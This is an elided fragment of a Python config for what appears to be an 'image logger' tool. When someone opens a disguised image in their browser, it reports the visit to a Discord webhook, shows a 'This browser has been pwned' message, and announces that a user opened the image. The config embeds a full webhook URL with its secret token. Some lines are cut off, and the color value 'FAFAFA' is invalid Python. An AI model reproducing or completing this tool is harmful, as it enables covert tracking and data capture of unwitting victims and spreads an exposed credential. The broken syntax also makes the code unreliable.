...
config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1375931639883894844/xzowIb_n1O-C3K2u4YkIHCM96qdQNheD6PaujKl-KtlfE1Q2ebLP_-OnwGTCdxBgUBxk",
    ...
    "color": FAFAFA, # Hex Color you want for the embed (Example: Red is 0xFF0000)
    ...
    "message": { # Show a custom message when the user opens the image
        ...
        "message": "This browser has been pwned", # Message to show
    ...
    "embeds": [
        {
            ...
            "color": config["color"],
            "description": f"""**A User Opened the Image In Their Browser!**
